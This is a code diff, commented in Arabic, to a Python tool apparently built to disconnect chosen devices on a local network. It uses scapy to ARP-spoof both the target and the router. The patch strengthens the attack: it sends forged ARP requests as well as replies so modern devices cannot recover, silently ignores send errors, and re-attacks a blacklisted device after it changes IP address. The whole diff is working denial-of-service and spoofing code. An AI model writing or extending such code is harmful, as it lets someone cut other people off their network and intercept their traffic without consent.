@@ -100,18 +100,18 @@ class Disconnector:
             try:
                 # إنشاء حزم ARP مزيفة
                 # خداع الهدف بأننا الراوتر
-                pkt_to_target = Ether(dst=target_mac) / ARP(
-                    op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip
-                )
-                # خداع الراوتر بأننا الهدف
+                # خداع الهدف
+                pkt_to_target_reply = Ether(dst=target_mac) / ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
+                pkt_to_target_req = Ether(dst=target_mac) / ARP(op=1, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
+                
+                # خداع الراوتر
                 gateway_mac = getmacbyip(gateway_ip)
                 if not gateway_mac:
                     log.error("لم يتم العثور على MAC الراوتر")
                     return
 
-                pkt_to_gateway = Ether(dst=gateway_mac) / ARP(
-                    op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip
-                )
+                pkt_to_gateway_reply = Ether(dst=gateway_mac) / ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip)
+                pkt_to_gateway_req = Ether(dst=gateway_mac) / ARP(op=1, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip)
 
                 # حجب تمرير البيانات (IP Forward) عبر جهازنا لضمان انقطاع الإنترنت عن الهدف
                 self.iptables_engine.block_mac(target_mac)
@@ -120,8 +120,13 @@ class Disconnector:
                     on_status(target_ip, "disconnected")
 
                 while attack_info["running"]:
-                    sendp(pkt_to_target, verbose=False)
-                    sendp(pkt_to_gateway, verbose=False)
+                    try:
+                        sendp(pkt_to_target_reply, verbose=False)
+                        sendp(pkt_to_target_req, verbose=False)
+                        sendp(pkt_to_gateway_reply, verbose=False)
+                        sendp(pkt_to_gateway_req, verbose=False)
+                    except Exception as loop_e:
+                        pass # تجاهل أخطاء الشبكة المؤقتة (مثل امتلاء الذاكرة المؤقتة أو سقوط الواجهة للحظات)
                     time.sleep(0.3)  # تسريع الحقن لمنع الأجهزة الحديثة من تصحيح الاتصال
 
                 # إعادة الاتصال
@@ -150,7 +155,7 @@ class Disconnector:
         thread.start()
         return True
 
-    def reconnect(self, target_ip):
+    def reconnect(self, target_ip, remove_from_blacklist=True):
         """إعادة الاتصال لجهاز محدد"""
         target_mac = None
         with self._lock:
@@ -164,7 +169,7 @@ class Disconnector:
                     target_mac = mac
                     break
             
-            if target_mac and target_mac in self._persistent_blacklist:
+            if remove_from_blacklist and target_mac and target_mac in self._persistent_blacklist:
                 del self._persistent_blacklist[target_mac]
 
         # التعامل مع أنواع الهجوم المختلفة
@@ -225,11 +230,22 @@ class Disconnector:
                 return False
             
             # تحديث الـ IP الجديد إن تغير
+            old_ip = info.get("ip")
+            if old_ip and old_ip != ip:
+                # إذا تغير الـ IP، نوقف الهجوم القديم مع بقاءه في القائمة السوداء
+                log.info(f"الجهاز {mac_upper} غير الـ IP الخاص به من {old_ip} إلى {ip}. تحديث الهجوم...")
+                # لا يمكننا استدعاء reconnect مباشرة هنا داخل lock بشكل متقاطع إذا كان lock مستخدم.
+                # سنقوم بتحديث الـ IP ونطلقه بعد الخروج من lock.
+            
             info["ip"] = ip
             gateway_ip = info.get("gateway_ip")
             attack_type = info.get("type", "arp")
             iface = info.get("iface")
             bssid = info.get("bssid")
+
+        # إذا تغير الـ IP وكان الهجوم القديم ما زال شغّالاً (IP قديم)، نقوم بإيقافه
+        if old_ip and old_ip != ip and self.is_disconnected(old_ip):
+            self.reconnect(old_ip, remove_from_blacklist=False)
 
         # إذا وصل هنا، يعني أن الجهاز ما زال معاقباً ويجب قطعه مجدداً
         # نحسب الوقت المتبقي لـ timer
